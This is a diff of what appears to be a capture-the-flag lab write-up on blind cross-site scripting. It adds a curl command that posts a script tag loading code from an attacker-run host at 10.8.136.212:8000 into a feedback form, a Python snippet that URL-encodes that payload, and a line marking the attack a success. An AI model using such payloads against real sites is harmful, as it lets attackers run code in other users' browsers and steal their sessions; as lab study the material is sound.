@@ -25,4 +25,29 @@ feedback=asdad
 
 # Blind XSS check
 
-curl -X POST http://10.10.242.129:8080/submit_feedback -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://10.10.242.129:8080" -H "Referer: http://10.10.242.129:8080/submit_feedback" --data "feedback=<script></script>"
+curl -X POST http://10.10.242.129:8080/submit_feedback -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://10.10.242.129:8080" -H "Referer: http://10.10.242.129:8080/submit_feedback" --data "feedback=<script src="http://10.8.136.212:8000/"></script>"
+
+# setting payload
+
+```python
+import urllib.parse
+
+def url_encode(text: str) -> str:
+    return urllib.parse.quote(text)
+
+def url_decode(encoded_text: str) -> str:
+    return urllib.parse.unquote(encoded_text)
+
+original = "<script src="http://10.8.136.212:8000/"></script>"
+encoded = url_encode(original)
+decoded = url_decode(encoded)
+
+print("original:", original)
+print("encoded:", encoded)
+print("decoded:", decoded)
+
+```
+
+# success the blind XSS
+
+![](https://velog.velcdn.com/images/agnusdei1207/post/b5252105-4522-428d-a133-2239d228ac67/image.png)
